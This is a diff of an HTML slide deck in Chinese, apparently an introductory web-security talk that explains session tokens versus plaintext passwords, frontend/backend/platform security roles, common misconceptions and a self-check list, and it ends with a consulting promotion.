-                            <div style="background: rgba(175,82,222,0.08); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid #af52de;">
-                                <div style="text-align: center; margin-bottom: 0.6rem;">
-                                    <div style="font-size: 2.2rem; margin-bottom: 0.3rem;">☁️</div>
-                                    <h3 style="color: #af52de; font-size: 1.05rem; margin-bottom: 0.2rem;">平台（環境）</h3>
-                                    <p style="font-size: 0.7rem; color: #666;">Cloudflare / AWS / GCP</p>
-                                </div>
-                                <div style="background: rgba(255,255,255,0.6); padding: 0.7rem; border-radius: 6px; margin-bottom: 0.6rem;">
-                                    <p style="font-size: 0.8rem; font-weight: 600; margin-bottom: 0.4rem; color: #34c759;">✅ 能補強的</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3; margin-bottom: 0.2rem;">• 抗 DDoS 流量攻擊</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3; margin-bottom: 0.2rem;">• WAF 擋漏網之魚</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3;">• 分流、快取減壓</p>
-                                </div>
-                                <div style="background: rgba(255,255,255,0.6); padding: 0.7rem; border-radius: 6px; margin-bottom: 0.6rem;">
-                                    <p style="font-size: 0.8rem; font-weight: 600; margin-bottom: 0.4rem; color: #ff3b30;">⚠️ 為什麼需要</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3;">有些攻擊靠程式擋不住（如 10 萬台殭屍機同時打你）</p>
-                                </div>
-                                <div style="background: rgba(175,82,222,0.15); padding: 0.6rem; border-radius: 6px;">
-                                    <p style="font-size: 0.75rem; line-height: 1.3; font-weight: 600; color: #af52de;">🏦 就像建築環境</p>
-                                    <p style="font-size: 0.65rem; line-height: 1.3; color: #666;">防火牆、警衛、監視器</p>
-                                </div>
-                            </div>
-                        </div>
+                  <h3 style="color: #34c759; font-size: 1.2rem; margin-bottom: 0.8rem; text-align: center">✓ Token</h3>
 
-                        <!-- 思維框架 -->
-                        <div style="background: linear-gradient(135deg, rgba(0,122,255,0.1) 0%, rgba(52,199,89,0.1) 100%); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid rgba(0,122,255,0.3);">
-                            <p style="font-size: 1.05rem; font-weight: 700; color: var(--primary-blue); margin-bottom: 0.6rem; text-align: center;">
-                                💡 帶走的思維工具：看到功能時問三個問題
-                            </p>
-                            <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.6rem;">
-                                <div style="text-align: center; background: rgba(255,255,255,0.5); padding: 0.6rem; border-radius: 6px;">
-                                    <p style="font-size: 0.8rem; font-weight: 600; color: var(--primary-blue); margin-bottom: 0.3rem;">使用者體驗？</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3; color: #666;">→ 前端可做<br>但不能只靠它</p>
-                                </div>
-                                <div style="text-align: center; background: rgba(255,255,255,0.5); padding: 0.6rem; border-radius: 6px;">
-                                    <p style="font-size: 0.8rem; font-weight: 600; color: #34c759; margin-bottom: 0.3rem;">規則或正確性？</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3; color: #666;">→ 後端必須做<br>這是最後防線</p>
-                                </div>
-                                <div style="text-align: center; background: rgba(255,255,255,0.5); padding: 0.6rem; border-radius: 6px;">
-                                    <p style="font-size: 0.8rem; font-weight: 600; color: #af52de; margin-bottom: 0.3rem;">流量環境風險？</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3; color: #666;">→ 交給平台<br>程式擋不住</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
+                  <p style="font-size: 1rem; line-height: 1.6; text-align: center">
+                    臨時通行證<br />過期就失效<br />
+
+                    <span style="color: #34c759; font-weight: 700">→ 限時有效</span>
+                  </p>
                 </div>
-            </section>
+              </div>
 
-            <!-- Slide 18：企業級防護的完整面貌 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2rem; margin-bottom: 0.8rem; color: var(--primary-blue);">企業級資安防護的真實樣貌</h2>
-                    <p style="font-size: 0.95rem; margin-bottom: 1rem; color: var(--text-secondary);">我們今天介紹的只是入門基礎，企業級標準做了非常非常多事情</p>
-                    <div style="max-width: 950px; margin: 0 auto;">
-                        <!-- 圖片展示區 -->
-                        <div style="background: white; padding: 1.2rem; border-radius: var(--radius-medium); margin-bottom: 1rem; border: 2px solid var(--primary-blue);">
-                            <img src="https://learn.microsoft.com/en-us/security/adoption/media/mcra/mcra-overview.png#lightbox"
-                                 alt="Microsoft 網路安全參考架構 (MCRA)"
-                                 style="width: 100%; height: auto; border-radius: 6px;">
-                            <p style="font-size: 0.75rem; color: #666; margin-top: 0.6rem; text-align: center;">
-                                來源：Microsoft Cybersecurity Reference Architecture (MCRA)
-                            </p>
-                        </div>
-                    </div>
+              <!-- 運作流程 -->
+
+              <div style="background: var(--background-tertiary); padding: 1.5rem; border-radius: var(--radius-medium)">
+                <h3 style="font-size: 1.2rem; margin-bottom: 1rem; color: var(--primary-blue)">🏢 實際運作</h3>
+
+                <div style="display: flex; flex-direction: column; gap: 0.8rem; font-size: 1rem">
+                  <p>1️⃣ 早上 9:00 → 警衛發給你今日通行證（登入取得 Token）</p>
+
+                  <p>2️⃣ 下午 6:00 → 通行證失效（Token 過期）</p>
+
+                  <p>3️⃣ 明天重新領證（重新登入）</p>
                 </div>
-            </section>
+              </div>
+            </div>
+          </div>
+        </section>
 
-            <!-- Slide 19：常見誤區 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2.2rem; margin-bottom: 1.2rem; color: var(--primary-blue);">常見誤區 & 快速問答</h2>
-                    <div style="max-width: 800px; margin: 0 auto;">
-                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 1.2rem; margin-bottom: 1.2rem;">
-                            <!-- 誤區 1 -->
-                            <div style="background: rgba(255,59,48,0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(255,59,48,0.3);">
-                                <h3 style="color: #ff3b30; font-size: 1.2rem; margin-bottom: 0.8rem;">❌ 大平台 = 安全？</h3>
-                                <p style="font-size: 0.95rem; line-height: 1.5; color: #666;">平台基礎設施安全</p>
-                                <p style="font-size: 0.95rem; line-height: 1.5; color: #ff3b30; font-weight: 600;">但你的設定、第三方元件仍會帶來風險</p>
-                            </div>
+        <!-- Slide 15：明碼的危險 -->
 
-                            <!-- 誤區 2 -->
-                            <div style="background: rgba(255,149,0,0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(255,149,0,0.3);">
-                                <h3 style="color: #ff9500; font-size: 1.2rem; margin-bottom: 0.8rem;">❌ 小站不會被攻擊？</h3>
-                                <p style="font-size: 0.95rem; line-height: 1.5; color: #666;">攻擊者用自動掃描器</p>
-                                <p style="font-size: 0.95rem; line-height: 1.5; color: #ff9500; font-weight: 600;">不管大小站都會被掃到</p>
-                            </div>
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 1.9rem; margin-bottom: 0.9rem; color: var(--primary-blue)">為什麼明碼是永久性風險？</h2>
 
-                            <!-- 誤區 3 -->
-                            <div style="background: rgba(175,82,222,0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(175,82,222,0.3);">
-                                <h3 style="color: #af52de; font-size: 1.2rem; margin-bottom: 0.8rem;">❌ 前端顯示 = 正確？</h3>
-                                <p style="font-size: 0.95rem; line-height: 1.5; color: #666;">前端只是介面</p>
-                                <p style="font-size: 0.95rem; line-height: 1.5; color: #af52de; font-weight: 600;">後端必須做最後驗證</p>
-                            </div>
+            <div style="max-width: 800px; margin: 0 auto">
+              <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.8rem; margin-bottom: 0.9rem">
+                <!-- 場景一 -->
 
-                            <!-- 誤區 4 -->
-                            <div style="background: rgba(0,122,255,0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(0,122,255,0.3);">
-                                <h3 style="color: var(--primary-blue); font-size: 1.2rem; margin-bottom: 0.8rem;">❌ HTTPS = 絕對安全？</h3>
-                                <p style="font-size: 0.95rem; line-height: 1.5; color: #666;">HTTPS 只保護傳輸</p>
-                                <p style="font-size: 0.95rem; line-height: 1.5; color: var(--primary-blue); font-weight: 600;">XSS、CSRF 照樣會發生</p>
-                            </div>
-                        </div>
+                <div style="background: rgba(255, 149, 0, 0.1); padding: 0.9rem; border-radius: var(--radius-medium); border-left: 3px solid #ff9500">
+                  <h3 style="color: #ff9500; font-size: 0.95rem; margin-bottom: 0.4rem">☕ 咖啡廳偷窺</h3>
 
-                        <!-- 核心訊息 -->
-                        <div style="background: var(--background-tertiary); padding: 1.5rem; border-radius: var(--radius-medium); text-align: center;">
-                            <p style="font-size: 1.3rem; font-weight: 600; color: var(--primary-blue);">
-                                安全 = 流程 + 習慣 + 檢查
-                            </p>
-                        </div>
-                    </div>
+                  <p style="font-size: 0.8rem; line-height: 1.4">→ 有人看到你螢幕上的密碼</p>
+
+                  <p style="font-size: 0.8rem; line-height: 1.4; color: #ff9500; font-weight: 600">→ 永遠可以登入</p>
                 </div>
-            </section>
 
-            <!-- Slide 20：快速自查清單 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2rem; margin-bottom: 1rem; color: var(--primary-blue);">快速自查清單</h2>
-                    <p style="font-size: 1rem; margin-bottom: 1.5rem; color: var(--text-secondary);">實際操作前，用這六個問題確認自己站在資安友善的軌道上。</p>
-                    <div style="max-width: 820px; margin: 0 auto;">
-                        <ul style="list-style: none; padding: 0; margin: 0; display: grid; gap: 0.9rem;">
-                            <li style="background: var(--background-tertiary); padding: 1rem 1.2rem; border-radius: var(--radius-medium); font-size: 0.95rem; line-height: 1.45; color: var(--text-primary);">
-                                <strong style="color: var(--primary-blue); display: block; margin-bottom: 0.3rem;">心態校準</strong>
-                                前端只負責介面，權限與驗證都交給後端；遇到異常先暫停並回報。
-                            </li>
-                            <li style="background: var(--background-tertiary); padding: 1rem 1.2rem; border-radius: var(--radius-medium); font-size: 0.95rem; line-height: 1.45; color: var(--text-primary);">
-                                <strong style="color: var(--primary-blue); display: block; margin-bottom: 0.3rem;">請求體檢視</strong>
-                                檢查 API request body，有沒有 price、role 等敏感數值；後端是否直接依這些值處理？那是 NG。
-                            </li>
-                            <li style="background: var(--background-tertiary); padding: 1rem 1.2rem; border-radius: var(--radius-medium); font-size: 0.95rem; line-height: 1.45; color: var(--text-primary);">
-                                <strong style="color: var(--primary-blue); display: block; margin-bottom: 0.3rem;">輸入與顯示</strong>
-                                留言、備註等欄位是否經過跳脫或驗證？畫面有沒有直接呈現使用者輸入的 HTML？
-                            </li>
-                            <li style="background: var(--background-tertiary); padding: 1rem 1.2rem; border-radius: var(--radius-medium); font-size: 0.95rem; line-height: 1.45; color: var(--text-primary);">
-                                <strong style="color: var(--primary-blue); display: block; margin-bottom: 0.3rem;">登入安全</strong>
-                                Cookie 設定 SameSite=Lax/Strict、HttpOnly 嗎？敏感操作會再要求 OTP 或再次輸入密碼嗎？
-                            </li>
-                            <li style="background: var(--background-tertiary); padding: 1rem 1.2rem; border-radius: var(--radius-medium); font-size: 0.95rem; line-height: 1.45; color: var(--text-primary);">
-                                <strong style="color: var(--primary-blue); display: block; margin-bottom: 0.3rem;">第三方資源</strong>
-                                列出外部 JS / CDN 來源，確認維運者可信且有備援方案，必要時考慮自建或鎖版。
-                            </li>
-                            <li style="background: var(--background-tertiary); padding: 1rem 1.2rem; border-radius: var(--radius-medium); font-size: 0.95rem; line-height: 1.45; color: var(--text-primary);">
-                                <strong style="color: var(--primary-blue); display: block; margin-bottom: 0.3rem;">異常處理</strong>
-                                發現異常價格或登入紀錄時，有沒有既定的紀錄方式、通報名單與回應流程？
-                            </li>
-                        </ul>
-                    </div>
+                <!-- 場景二 -->
+
+                <div style="background: rgba(255, 59, 48, 0.1); padding: 0.9rem; border-radius: var(--radius-medium); border-left: 3px solid #ff3b30">
+                  <h3 style="color: #ff3b30; font-size: 0.95rem; margin-bottom: 0.4rem">💾 資料庫被駭</h3>
+
+                  <p style="font-size: 0.8rem; line-height: 1.4">→ 所有密碼被看光</p>
+
+                  <p style="font-size: 0.8rem; line-height: 1.4; color: #ff3b30; font-weight: 600">→ 受害者換密碼前都有效</p>
                 </div>
-            </section>
 
-            <!-- Slide 21：一對一技術諮詢服務 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 1.8rem; margin-bottom: 0.5rem; color: var(--primary-blue);">一對一技術諮詢服務</h2>
-                    <p style="font-size: 0.8rem; margin-bottom: 0.7rem; color: var(--text-secondary);">多年實務開發 x AI 協作與應用經驗</p>
-                    <div style="max-width: 900px; margin: 0 auto;">
-                       
-                        <!-- 諮詢內容 -->
-                        <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.6rem; margin-bottom: 0.7rem;">
-                            <!-- 第一項 -->
-                            <div style="background: rgba(52,199,89,0.1); padding: 0.7rem; border-radius: var(--radius-medium); border-left: 4px solid #34c759;">
-                                <div style="text-align: center; font-size: 1.5rem; margin-bottom: 0.3rem;">💡</div>
-                                <h3 style="color: #34c759; font-size: 0.85rem; margin-bottom: 0.3rem; text-align: center;">Idea → 實現</h3>
-                                <p style="font-size: 0.65rem; line-height: 1.2; text-align: center; color: #666;">
-                                    從 insight 到技術實現與架構設計
-                                </p>
-                            </div>
+                <!-- 場景三 -->
 
-                            <!-- 第二項 -->
-                            <div style="background: rgba(255,149,0,0.1); padding: 0.7rem; border-radius: var(--radius-medium); border-left: 4px solid #ff9500;">
-                                <div style="text-align: center; font-size: 1.5rem; margin-bottom: 0.3rem;">⚠️</div>
-                                <h3 style="color: #ff9500; font-size: 0.85rem; margin-bottom: 0.3rem; text-align: center;">問題預測</h3>
-                                <p style="font-size: 0.65rem; line-height: 1.2; text-align: center; color: #666;">
-                                    每個環節可能遇到的問題與專業知識
-                                </p>
-                            </div>
+                <div style="background: rgba(175, 82, 222, 0.1); padding: 0.9rem; border-radius: var(--radius-medium); border-left: 3px solid #af52de">
+                  <h3 style="color: #af52de; font-size: 0.95rem; margin-bottom: 0.4rem">🔗 撞庫攻擊</h3>
 
-                            <!-- 第三項 -->
-                            <div style="background: rgba(0,122,255,0.1); padding: 0.7rem; border-radius: var(--radius-medium); border-left: 4px solid var(--primary-blue);">
-                                <div style="text-align: center; font-size: 1.5rem; margin-bottom: 0.3rem;">🧠</div>
-                                <h3 style="color: var(--primary-blue); font-size: 0.85rem; margin-bottom: 0.3rem; text-align: center;">核心 Mindset</h3>
-                                <p style="font-size: 0.65rem; line-height: 1.2; text-align: center; color: #666;">
-                                    必須具備的各種思維模式
-                                </p>
-                            </div>
-                        </div>
+                  <p style="font-size: 0.8rem; line-height: 1.4">→ 同密碼用多個網站</p>
 
-                        <!-- 痛點 & 解法 -->
-                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.6rem; margin-bottom: 0.7rem;">
-                            <!-- 常見痛點 -->
-                            <div style="background: rgba(255,59,48,0.1); padding: 0.7rem; border-radius: var(--radius-medium); border: 2px solid rgba(255,59,48,0.3);">
-                                <h3 style="color: #ff3b30; font-size: 0.85rem; margin-bottom: 0.4rem; text-align: center;">🚨 2025 常見痛點</h3>
-                                <div style="font-size: 0.7rem; line-height: 1.3; text-align: left;">
-                                    <p style="margin-bottom: 0.25rem;">• 上架後維護成「屎山」</p>
-                                    <p style="margin-bottom: 0.25rem;">• 更新時改 A 壞 B</p>
-                                    <p>• 三天兩頭被資料庫爆破</p>
-                                </div>
-                            </div>
-
-                            <!-- 諮詢目標 -->
-                            <div style="background: rgba(52,199,89,0.1); padding: 0.7rem; border-radius: var(--radius-medium); border: 2px solid rgba(52,199,89,0.3);">
-                                <h3 style="color: #34c759; font-size: 0.85rem; margin-bottom: 0.4rem; text-align: center;">✅ 我們一起做到</h3>
-                                <div style="font-size: 0.7rem; line-height: 1.3; text-align: left;">
-                                    <p style="margin-bottom: 0.25rem;">• 安全性 + 維護性 + 擴充性</p>
-                                    <p style="margin-bottom: 0.25rem;">• 企業級標準思維</p>
-                                    <p>• Junior → 進階特質養成</p>
-                                </div>
-                            </div>
-                        </div>
-
-                        <!-- CTA -->
-                        <div style="background: linear-gradient(135deg, rgba(0,122,255,0.15) 0%, rgba(175,82,222,0.15) 100%); padding: 0.8rem; border-radius: var(--radius-medium); border: 2px solid var(--primary-blue); text-align: center;">
-                            <p style="font-size: 0.9rem; font-weight: 700; color: var(--primary-blue); margin-bottom: 0.4rem;">
-                                🎯 適合新手工程師 / Vibe Coder
-                            </p>
-                            <p style="font-size: 0.75rem; line-height: 1.3; color: #666; margin-bottom: 0.5rem;">
-                                不藏私、傾囊相授，保證你收穫滿滿
-                            </p>
-                            <div style="display: flex; justify-content: center; gap: 0.8rem; flex-wrap: wrap;">
-                                <a href="https://buymeacoffee.com/cablate/e/448257" target="_blank" rel="noopener noreferrer"
-                                   style="font-size: 0.75rem; padding: 0.35rem 0.7rem; background: var(--primary-blue); color: white; border-radius: 6px; font-weight: 600; text-decoration: none; display: inline-block; transition: background 0.3s;">
-                                    🔗 立即預約諮詢
-                                </a>
-                            </div>
-                        </div>
-                    </div>
+                  <p style="font-size: 0.8rem; line-height: 1.4; color: #af52de; font-weight: 600">→ 一個被盜全部遭殃</p>
                 </div>
-            </section>
 
-            <!-- Slide 22：Q&A -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 3rem; margin-bottom: 1.5rem; color: var(--primary-blue);">問題時間</h2>
-                    <div style="max-width: 700px; margin: 0 auto;">
-                        <div style="background: var(--background-tertiary); padding: 2.5rem; border-radius: var(--radius-large); text-align: center;">
-                            <div style="font-size: 4rem; margin-bottom: 1.5rem;">💬</div>
-                        </div>
-                    </div>
+                <!-- 場景四 -->
+
+                <div style="background: rgba(255, 45, 85, 0.1); padding: 0.9rem; border-radius: var(--radius-medium); border-left: 3px solid #ff2d55">
+                  <h3 style="color: #ff2d55; font-size: 0.95rem; margin-bottom: 0.4rem">👥 內部員工</h3>
+
+                  <p style="font-size: 0.8rem; line-height: 1.4">→ 離職員工還記得密碼</p>
+
+                  <p style="font-size: 0.8rem; line-height: 1.4; color: #ff2d55; font-weight: 600">→ 隨時可能回來搞破壞</p>
                 </div>
-            </section>
+              </div>
 
-        </div>
+              <!-- 對比：Token 的優勢 -->
+
+              <div style="background: rgba(52, 199, 89, 0.1); padding: 1.1rem; border-radius: var(--radius-medium); border: 2px solid rgba(52, 199, 89, 0.3)">
+                <h3 style="color: #34c759; font-size: 1.05rem; margin-bottom: 0.5rem">✅ Token 如何解決</h3>
+
+                <p style="font-size: 0.9rem; line-height: 1.5">
+                  Token 每 15 分鐘過期 → 即使被偷，時間到就失效<br />
+
+                  離職員工的 Token 立即撤銷 → 無法再進入系統
+                </p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 16：Token 安全檢查重點 (精簡版) -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2rem; margin-bottom: 0.8rem; color: var(--primary-blue)">你可以檢查的 Token 安全指標</h2>
+
+            <p style="font-size: 0.9rem; margin-bottom: 0.9rem; color: var(--text-secondary)">不用懂技術,也能看出系統有沒有做好</p>
+
+            <div style="max-width: 750px; margin: 0 auto">
+              <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.9rem">
+                <!-- 檢查點 1 -->
+
+                <div style="background: rgba(52, 199, 89, 0.1); padding: 1rem; border-radius: var(--radius-medium); border-left: 4px solid #34c759">
+                  <h3 style="color: #34c759; font-size: 1rem; margin-bottom: 0.4rem">✅ 會自動登出?</h3>
+
+                  <p style="font-size: 0.8rem; line-height: 1.3">15-30 分鐘沒操作應該登出<br />→ 有設定有效期限</p>
+                </div>
+
+                <!-- 檢查點 2 -->
+
+                <div style="background: rgba(0, 122, 255, 0.1); padding: 1rem; border-radius: var(--radius-medium); border-left: 4px solid var(--primary-blue)">
+                  <h3 style="color: var(--primary-blue); font-size: 1rem; margin-bottom: 0.4rem">✅ 需二次驗證?</h3>
+
+                  <p style="font-size: 0.8rem; line-height: 1.3">轉帳/改密碼要再輸密碼<br />→ 有額外防護</p>
+                </div>
+
+                <!-- 檢查點 3 -->
+
+                <div style="background: rgba(255, 149, 0, 0.1); padding: 1rem; border-radius: var(--radius-medium); border-left: 4px solid #ff9500">
+                  <h3 style="color: #ff9500; font-size: 1rem; margin-bottom: 0.4rem">✅ 可登出所有裝置?</h3>
+
+                  <p style="font-size: 0.8rem; line-height: 1.3">一鍵撤銷所有登入<br />→ 可撤銷 Token</p>
+                </div>
+
+                <!-- 檢查點 4 -->
+
+                <div style="background: rgba(255, 59, 48, 0.1); padding: 1rem; border-radius: var(--radius-medium); border-left: 4px solid #ff3b30">
+                  <h3 style="color: #ff3b30; font-size: 1rem; margin-bottom: 0.4rem">✅ 異常登入通知?</h3>
+
+                  <p style="font-size: 0.8rem; line-height: 1.3">新裝置登入會收通知<br />→ 有偵測異常</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 17：Token 核心特色 (精簡版) -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2rem; margin-bottom: 0.8rem; color: var(--primary-blue)">Token 的核心特色</h2>
+
+            <p style="font-size: 0.9rem; margin-bottom: 0.9rem; color: var(--text-secondary)">為什麼 Token 比明碼密碼安全?</p>
+
+            <div style="max-width: 700px; margin: 0 auto">
+              <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.9rem; margin-bottom: 1rem">
+                <!-- 特色 1 -->
+
+                <div style="background: rgba(52, 199, 89, 0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid #34c759">
+                  <div style="text-align: center; font-size: 2rem; margin-bottom: 0.5rem">⏱️</div>
+
+                  <h3 style="color: #34c759; font-size: 0.95rem; margin-bottom: 0.4rem; text-align: center">有效期限</h3>
+
+                  <p style="font-size: 0.75rem; line-height: 1.3; text-align: center">過期自動失效</p>
+                </div>
+
+                <!-- 特色 2 -->
+
+                <div style="background: rgba(0, 122, 255, 0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid var(--primary-blue)">
+                  <div style="text-align: center; font-size: 2rem; margin-bottom: 0.5rem">🚫</div>
+
+                  <h3 style="color: var(--primary-blue); font-size: 0.95rem; margin-bottom: 0.4rem; text-align: center">可撤銷</h3>
+
+                  <p style="font-size: 0.75rem; line-height: 1.3; text-align: center">登出立即失效</p>
+                </div>
+
+                <!-- 特色 3 -->
+
+                <div style="background: rgba(255, 149, 0, 0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid #ff9500">
+                  <div style="text-align: center; font-size: 2rem; margin-bottom: 0.5rem">🔐</div>
+
+                  <h3 style="color: #ff9500; font-size: 0.95rem; margin-bottom: 0.4rem; text-align: center">防偽造</h3>
+
+                  <p style="font-size: 0.75rem; line-height: 1.3; text-align: center">數位簽名驗證</p>
+                </div>
+
+                <!-- 特色 4 -->
+
+                <div style="background: rgba(175, 82, 222, 0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid #af52de">
+                  <div style="text-align: center; font-size: 2rem; margin-bottom: 0.5rem">🔔</div>
+
+                  <h3 style="color: #af52de; font-size: 0.95rem; margin-bottom: 0.4rem; text-align: center">異常偵測</h3>
+
+                  <p style="font-size: 0.75rem; line-height: 1.3; text-align: center">綁定裝置資訊</p>
+                </div>
+              </div>
+
+              <!-- 核心訊息 -->
+
+              <div style="background: rgba(52, 199, 89, 0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid rgba(52, 199, 89, 0.3)">
+                <p style="font-size: 1rem; font-weight: 600; color: #34c759; text-align: center; margin-bottom: 0.4rem">明碼密碼 = 永久鑰匙 (被偷永久有效)</p>
+
+                <p style="font-size: 1rem; font-weight: 600; color: var(--primary-blue); text-align: center">Token = 臨時通行證 (限時、可撤銷、可偵測)</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 17.5：網站架構回顧與資安對應 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 1.9rem; margin-bottom: 0.7rem; color: var(--primary-blue)">回顧：網站三層架構與資安職責</h2>
+
+            <p style="font-size: 0.9rem; margin-bottom: 0.9rem; color: var(--text-secondary)">理解你的角色，才知道該守護什麼</p>
+
+            <div style="max-width: 900px; margin: 0 auto">
+              <!-- 三層架構 -->
+
+              <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.7rem; margin-bottom: 0.9rem">
+                <!-- 前端 -->
+
+                <div style="background: rgba(0, 122, 255, 0.08); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid var(--primary-blue)">
+                  <div style="text-align: center; margin-bottom: 0.6rem">
+                    <div style="font-size: 2.2rem; margin-bottom: 0.3rem">📱</div>
+
+                    <h3 style="color: var(--primary-blue); font-size: 1.05rem; margin-bottom: 0.2rem">前端（用戶端）</h3>
+
+                    <p style="font-size: 0.7rem; color: #666">跑在使用者裝置上</p>
+                  </div>
+
+                  <div style="background: rgba(255, 255, 255, 0.6); padding: 0.7rem; border-radius: 6px; margin-bottom: 0.6rem">
+                    <p style="font-size: 0.8rem; font-weight: 600; margin-bottom: 0.4rem; color: #34c759">✅ 能做的</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3; margin-bottom: 0.2rem">• 基本檢查（欄位格式）</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3">• 使用者體驗回饋</p>
+                  </div>
+
+                  <div style="background: rgba(255, 255, 255, 0.6); padding: 0.7rem; border-radius: 6px; margin-bottom: 0.6rem">
+                    <p style="font-size: 0.8rem; font-weight: 600; margin-bottom: 0.4rem; color: #ff3b30">⚠️ 不能單靠的</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3; margin-bottom: 0.2rem">• 安全檢查（可被改）</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3">• 權限控管、金額驗證</p>
+                  </div>
+
+                  <div style="background: rgba(0, 122, 255, 0.15); padding: 0.6rem; border-radius: 6px">
+                    <p style="font-size: 0.75rem; line-height: 1.3; font-weight: 600; color: var(--primary-blue)">🏦 就像櫃檯職員</p>
+
+                    <p style="font-size: 0.65rem; line-height: 1.3; color: #666">能提醒表格填對，但不能核准貸款</p>
+                  </div>
+                </div>
+
+                <!-- 後端 -->
+
+                <div style="background: rgba(52, 199, 89, 0.08); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid #34c759">
+                  <div style="text-align: center; margin-bottom: 0.6rem">
+                    <div style="font-size: 2.2rem; margin-bottom: 0.3rem">🖥️</div>
+
+                    <h3 style="color: #34c759; font-size: 1.05rem; margin-bottom: 0.2rem">後端（伺服器）</h3>
+
+                    <p style="font-size: 0.7rem; color: #666">公司自己控制</p>
+                  </div>
+
+                  <div style="background: rgba(255, 255, 255, 0.6); padding: 0.7rem; border-radius: 6px; margin-bottom: 0.6rem">
+                    <p style="font-size: 0.8rem; font-weight: 600; margin-bottom: 0.4rem; color: #34c759">✅ 要負責的</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3; margin-bottom: 0.2rem">• 身分驗證 & 權限管理</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3; margin-bottom: 0.2rem">• 資料正確性檢查</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3">• Rate Limit、加密日誌</p>
+                  </div>
+
+                  <div style="background: rgba(255, 255, 255, 0.6); padding: 0.7rem; border-radius: 6px; margin-bottom: 0.6rem">
+                    <p style="font-size: 0.8rem; font-weight: 600; margin-bottom: 0.4rem; color: #ff3b30">⚠️ 為什麼重要</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3">攻擊者可跳過前端直接打 API，只有後端能把關</p>
+                  </div>
+
+                  <div style="background: rgba(52, 199, 89, 0.15); padding: 0.6rem; border-radius: 6px">
+                    <p style="font-size: 0.75rem; line-height: 1.3; font-weight: 600; color: #34c759">🏦 就像銀行金庫</p>
+
+                    <p style="font-size: 0.65rem; line-height: 1.3; color: #666">決定誰能開保險箱、提領上限</p>
+                  </div>
+                </div>
+
+                <!-- 平台 -->
+
+                <div style="background: rgba(175, 82, 222, 0.08); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid #af52de">
+                  <div style="text-align: center; margin-bottom: 0.6rem">
+                    <div style="font-size: 2.2rem; margin-bottom: 0.3rem">☁️</div>
+
+                    <h3 style="color: #af52de; font-size: 1.05rem; margin-bottom: 0.2rem">平台（環境）</h3>
+
+                    <p style="font-size: 0.7rem; color: #666">Cloudflare / AWS / GCP</p>
+                  </div>
+
+                  <div style="background: rgba(255, 255, 255, 0.6); padding: 0.7rem; border-radius: 6px; margin-bottom: 0.6rem">
+                    <p style="font-size: 0.8rem; font-weight: 600; margin-bottom: 0.4rem; color: #34c759">✅ 能補強的</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3; margin-bottom: 0.2rem">• 抗 DDoS 流量攻擊</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3; margin-bottom: 0.2rem">• WAF 擋漏網之魚</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3">• 分流、快取減壓</p>
+                  </div>
+
+                  <div style="background: rgba(255, 255, 255, 0.6); padding: 0.7rem; border-radius: 6px; margin-bottom: 0.6rem">
+                    <p style="font-size: 0.8rem; font-weight: 600; margin-bottom: 0.4rem; color: #ff3b30">⚠️ 為什麼需要</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3">有些攻擊靠程式擋不住（如 10 萬台殭屍機同時打你）</p>
+                  </div>
+
+                  <div style="background: rgba(175, 82, 222, 0.15); padding: 0.6rem; border-radius: 6px">
+                    <p style="font-size: 0.75rem; line-height: 1.3; font-weight: 600; color: #af52de">🏦 就像建築環境</p>
+
